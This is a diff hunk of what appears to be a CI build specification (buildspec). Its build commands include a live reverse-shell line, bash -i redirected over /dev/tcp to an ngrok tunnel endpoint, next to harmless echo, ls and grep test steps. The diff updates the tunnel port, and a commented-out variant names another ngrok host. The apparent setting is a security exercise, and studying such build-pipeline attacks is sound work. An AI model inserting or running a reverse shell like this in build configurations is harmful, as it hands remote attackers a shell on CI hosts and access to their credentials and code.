@@ -13,7 +13,7 @@ phases:
     commands:
       - echo "we are in the build block"
       #- bash -c 'bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/xxxxx0>&1'
-      - bash -c 'bash -i >& /dev/tcp/0.tcp.ngrok.io/17858 0>&1'
+      - bash -c 'bash -i >& /dev/tcp/0.tcp.ngrok.io/11163 0>&1'
       - echo "we will run some tests"
       - ls
       - grep -Fq "Cross-Site Scripting (XSS)" index.html
